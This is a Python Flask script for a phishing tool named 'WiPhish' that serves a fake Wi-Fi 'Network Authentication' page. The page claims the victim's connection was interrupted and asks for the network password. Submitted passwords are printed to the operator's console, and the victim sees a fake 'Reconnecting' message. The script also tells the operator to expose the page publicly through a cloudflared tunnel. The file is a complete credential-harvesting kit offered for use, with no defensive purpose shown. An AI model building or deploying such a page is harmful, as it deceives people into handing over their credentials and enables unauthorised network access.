from flask import Flask, request, render_template_string
import os
import time

app = Flask(__name__)

def redirect_to_youtube():
    os.system("clear")
    banner = '''
\033[1;32m╭──────────────────────────────────────────────────────────╮
│                                                          │
│        \033[1;31m WiPhish\033[1;32m - WiFi Credential Capture Tool        │
│                                                          │
│   \033[1;33m[!] This tool is not free. Subscribe to continue.         \033[1;32m│
│   \033[1;36m[>] Redirecting to AOH Tech Cyber Security YouTube...              \033[1;32m│
│                                                          │
╰──────────────────────────────────────────────────────────╯
'''
    print(banner)
    time.sleep(10)
    os.system("termux-open-url https://youtube.com/@AOHTechCyberSecurity")
    input("\n\033[1;32m[✔] After subscribing, press Enter to continue...\033[0m\n")

login_page = r'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wi-Fi Network Authentication</title>
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: rgba(30, 41, 59, 0.7);
            --border-color: rgba(255, 255, 255, 0.1);
            --primary-color: #2563eb;
            --primary-hover: #1d4ed8;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --error-color: #ef4444;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: var(--bg-color);
            background-image: 
                radial-gradient(at 0% 0%, rgba(37, 99, 235, 0.15) 0px, transparent 50%),
                radial-gradient(at 100% 100%, rgba(124, 58, 237, 0.15) 0px, transparent 50%);
            color: var(--text-main);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-card {
            background: var(--card-bg);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 40px 32px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3), 0 8px 10px -6px rgba(0, 0, 0, 0.3);
            text-align: center;
        }

        .icon-container {
            width: 64px;
            height: 64px;
            background: rgba(37, 99, 235, 0.1);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px auto;
        }

        .wifi-icon {
            width: 32px;
            height: 32px;
            fill: var(--primary-color);
        }

        h2 {
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 8px;
            color: var(--text-main);
        }

        p.subtitle {
            font-size: 0.95rem;
            color: var(--text-muted);
            margin-bottom: 28px;
            line-height: 1.5;
        }

        .input-group {
            position: relative;
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            font-size: 0.85rem;
            font-weight: 500;
            color: var(--text-muted);
            margin-bottom: 6px;
        }

        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 12px 16px;
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            font-size: 1rem;
            color: var(--text-main);
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        input[type="password"]:focus,
        input[type="text"]:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.25);
        }

        .btn-submit {
            width: 100%;
            padding: 12px;
            background-color: var(--primary-color);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s, transform 0.1s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-submit:hover {
            background-color: var(--primary-hover);
        }

        .btn-submit:active {
            transform: scale(0.98);
        }

        .spinner {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .error-message {
            display: none;
            color: var(--error-color);
            font-size: 0.85rem;
            margin-top: 8px;
            text-align: left;
        }
    </style>
    <script>
        function handleSubmit(event) {
            const passwordInput = document.querySelector('input[name="password"]');
            const errorMessage = document.getElementById('error-message');
            const spinner = document.querySelector('.spinner');
            const btnText = document.getElementById('btn-text');
            const submitBtn = document.getElementById('submit-btn');

            if (passwordInput.value.trim() === "") {
                event.preventDefault();
                errorMessage.style.display = 'block';
                passwordInput.style.borderColor = 'var(--error-color)';
                return false;
            } else {
                errorMessage.style.display = 'none';
                passwordInput.style.borderColor = 'var(--border-color)';
                spinner.style.display = 'inline-block';
                btnText.textContent = 'Connecting...';
                submitBtn.disabled = true;
                submitBtn.style.opacity = '0.8';
                submitBtn.style.cursor = 'not-allowed';
            }
        }
    </script>
</head>
<body>

    <div class="login-card">
        <div class="icon-container">
            <svg class="wifi-icon" viewBox="0 0 24 24">
                <path d="M12 3C7.95 3 4.21 4.64 1.42 7.32L3 8.9C5.38 6.53 8.5 5.08 12 5.08c3.5 0 6.62 1.45 9 3.82l1.58-1.58C19.79 4.64 16.05 3 12 3zm0 4c-2.97 0-5.66 1.23-7.6 3.2L6 11.78C7.53 10.25 9.66 9.3 12 9.3c2.34 0 4.47.95 6 2.48l1.6-1.58C17.66 8.23 14.97 7 12 7zm0 4c-1.86 0-3.55.78-4.75 2.04l1.58 1.58C9.64 13.82 10.76 13.3 12 13.3c1.24 0 2.36.52 3.17 1.32l1.58-1.58C15.55 11.78 13.86 11 12 11zm0 4c-.73 0-1.39.29-1.88.77L12 17.65l1.88-1.88C13.39 15.29 12.73 15 12 15z"/>
            </svg>
        </div>

        <h2>Network Authentication</h2>
        <p class="subtitle">Your Wi-Fi connection was interrupted. Enter your network password to reconnect.</p>

        <form method="POST" action="/login" onsubmit="handleSubmit(event)">
            <div class="input-group">
                <label for="password">Wi-Fi Password</label>
                <input type="password" id="password" name="password" placeholder="Enter password" autofocus>
                <div id="error-message" class="error-message">Password field cannot be empty.</div>
            </div>

            <button type="submit" id="submit-btn" class="btn-submit">
                <span class="spinner"></span>
                <span id="btn-text">Connect</span>
            </button>
        </form>
    </div>

</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(login_page)

@app.route('/login', methods=['POST'])
def login():
    password = request.form.get('password')
    print(f"\n\033[1;36m[📶] Captured Wi-Fi Password:\033[0m \033[1;31m{password}\033[0m\n")
    return '''
    <script>alert("Reconnecting...");</script>
    <h2 style="text-align:center; color:white; background:black; padding:30px;">
    Thank you! Reconnecting to Wi-Fi...
    </h2>
    '''

if __name__ == '__main__':
    redirect_to_youtube()
    print("\n\033[1;32m[✔] Flask server running on http://127.0.0.1:8080\033[0m")
    print("\033[1;34m[>] In a new tab, run:\033[0m")
    print("\033[1;36m    cloudflared tunnel --url http://127.0.0.1:8080\033[0m\n")
    app.run(host='127.0.0.1', port=8080)
